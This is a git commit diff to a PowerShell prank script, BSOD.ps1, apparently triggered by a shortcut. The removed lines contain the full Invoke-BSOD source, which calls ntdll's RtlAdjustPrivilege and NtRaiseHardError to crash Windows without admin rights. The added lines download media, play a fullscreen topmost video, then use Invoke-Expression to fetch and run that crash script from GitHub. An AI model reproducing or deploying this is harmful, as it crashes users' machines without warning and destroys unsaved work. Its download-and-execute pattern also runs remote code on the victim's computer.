2388604f6cd5fda7a1a4141da5ff96ff4d9c6125
YeetTheAnson <113901821+YeetTheAnson@users.noreply.github.com>
2024-06-29 19:30:19 +0800

    Update BSOD.ps1

--- shortcutactivation/BlueScreen/BSOD.ps1
+++ shortcutactivation/BlueScreen/BSOD.ps1
@@ -1,80 +1,56 @@
-function Invoke-BSOD {
-<#
-.SYNOPSIS
+# Change directory to Music
+Set-Location -Path ([Environment]::GetFolderPath("MyMusic"))
 
-Invokes a Blue Screen of Death on Windows without requiring admin privileges.
-Author:  Barrett Adams (@peewpw)
+# Download the video
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/shortcutactivation/BlueScreen/BlueScreen.mp4" -OutFile "BlueScreen.mp4"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/shortcutactivation/BlueScreen/BlueScreen.wav" -OutFile "BlueScreen.wav"
 
-.DESCRIPTION
+(New-Object System.Media.SoundPlayer "BlueScreen.wav").Play()
+Start-Sleep -Seconds 3
 
-Raises an error that causes a Blue Screen of Death on Windows. It does this without
-requiring administrator privileges.
+# Load WPF assemblies
+Add-Type -AssemblyName PresentationFramework
+Add-Type -AssemblyName System.ComponentModel
 
-.EXAMPLE
-
-PS>Import-Module .\Invoke-BSOD.ps1
-PS>Invoke-BSOD
-   (Blue Screen Incoming...)
-
-#>
-$source = @"
-using System;
-using System.Runtime.InteropServices;
-
-public static class CS{
-	[DllImport("ntdll.dll")]
-	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-
-	[DllImport("ntdll.dll")]
-	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
-
-	public static unsafe void Kill(){
-		Boolean tmp1;
-		uint tmp2;
-		RtlAdjustPrivilege(19, true, false, out tmp1);
-		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
-	}
-}
+# Define XAML for the video player window
+[xml]$XAML = @"
+<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="PowerShell Video Player" WindowStyle="None" WindowState="Maximized" Topmost="True">
+    <Grid>
+        <MediaElement Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"/>
+    </Grid>
+</Window>
 "@
-    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
-    $comparams.CompilerOptions = '/unsafe'
-    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
-    [CS]::Kill()
-}
 
-function Get-DumpSettings {
-<#
-.SYNOPSIS
+# Define paths
+$VideoSource = Join-Path -Path $PWD.Path -ChildPath "BlueScreen.mp4"
 
-Gets the crash dump settings
-Author:  Barrett Adams (@peewpw)
+# Load the XAML and initialize the video player
+$XAMLReader = (New-Object System.Xml.XmlNodeReader $XAML)
+$Window = [Windows.Markup.XamlReader]::Load($XAMLReader)
+$VideoPlayer = $Window.FindName("VideoPlayer")
 
-.DESCRIPTION
+# Configure video player settings
+$VideoPlayer.Volume = 100
+$VideoPlayer.Source = $VideoSource
+$VideoPlayer.Play()
 
-Queries the registry for crash dump settings so that you'll have some idea
-what type of dump you're going to generate, and where it will be.
+# Start the timer to close the window after 6 seconds
+$Timer = New-Object System.Windows.Threading.DispatcherTimer
+$Timer.Interval = [TimeSpan]::FromSeconds(15)
+$Timer.Add_Tick({
+    $Timer.Stop()
+    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
 
-.EXAMPLE
+})
 
-PS>Import-Module .\Invoke-BSOD.ps1
-PS>Invoke-BSOD
-   (Blue Screen Incoming...)
+# Start countdown timer after the video starts playing and execute BSOD
+$VideoPlayer.Add_Loaded({
+    $Timer.Start()
 
-#>
-	$regdata = Get-ItemProperty -path HKLM:\System\CurrentControlSet\Control\CrashControl
+})
 
-	$dumpsettings = @{}
-	$dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
-		1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
-		2 {"Kernel Memory Dump"}
-		3 {"Small Memory Dump"}
-		7 {"Automatic Memory Dump"}
-		default {"Unknown"}
-	}
-	$dumpsettings.DumpFileLocation = $regdata.DumpFile
-	[bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
-	[bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
-	[bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
-	[bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
-	$dumpsettings
-}
+# Display the window and prevent other windows from stealing focus
+$Window.Topmost = $true
+$Window.ShowDialog() | Out-Null
